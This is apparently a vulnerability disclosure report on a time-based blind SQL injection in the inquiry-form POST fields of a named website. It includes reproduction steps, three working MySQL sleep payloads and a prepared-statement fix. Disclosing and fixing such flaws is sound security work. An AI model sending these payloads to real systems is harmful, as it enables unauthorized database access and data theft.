# SQL Injection - Time-Based Blind (POST Request)

## Summary

I identified a Time-Based Blind SQL Injection vulnerability in the application.

The application accepts user-controlled input through POST parameters and concatenates it directly into SQL queries without proper sanitization or parameterization. By injecting time-based SQL payloads, an attacker can infer database information based on the response time of the server. The payloads cause the database to sleep for a specified duration, confirming the presence of a SQL injection vulnerability.

An attacker can craft malicious inputs that cause the database to delay its response, allowing the attacker to determine if the injection was successful.

## Vulnerability Type

**SQL Injection (Time-Based Blind)**

## Vulnerable Parameters

```text
full_name
email
phone
message
(inquiry form fields)
```

## Vulnerable URL

```text
https://kzlab.in/subdomains/stats/index.php
```

## Steps to Reproduce

1. Intercept a POST request using Burp Suite or similar proxy tool.

2. Replace any parameter value with a time-based payload:

   ```text
   'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
   ```

3. Send the request.

4. Observe that the server takes approximately 10 seconds to respond, confirming successful injection.

## Payloads Used

```text
'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
'XOR(94102*if(now()=sysdate(),sleep(10),0))XOR'Z
'XOR(if(now()=sysdate(),sleep(5*5),0))OR'Z
```

## Proof of Concept

The application takes user input and concatenates it into a SQL query:

```sql
INSERT INTO inquiries (full_name, email, message) VALUES ('fab', 'xyz@qmail.com', '...')
```

With the injected payload, the query executes the sleep function:

```sql
'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
```

When `now()=sysdate()` evaluates to true, the `sleep(10)` function is executed, causing a 10-second delay.

## Impact

An attacker can:

- Enumerate database structure and content without seeing output
- Extract sensitive data (usernames, passwords, personal information)
- Bypass authentication mechanisms
- Gain unauthorized access to the application

## Recommendation

To mitigate this vulnerability:

- Use **prepared statements** with parameterized queries.
  ```php
  $stmt = $conn->prepare("INSERT INTO table (full_name, email) VALUES (?, ?)");
  $stmt->bind_param("ss", $full_name, $email);
  $stmt->execute();
  ```

- Use **input validation** to filter special characters.
  ```php
  $full_name = mysqli_real_escape_string($conn, $_POST['full_name']);
  ```
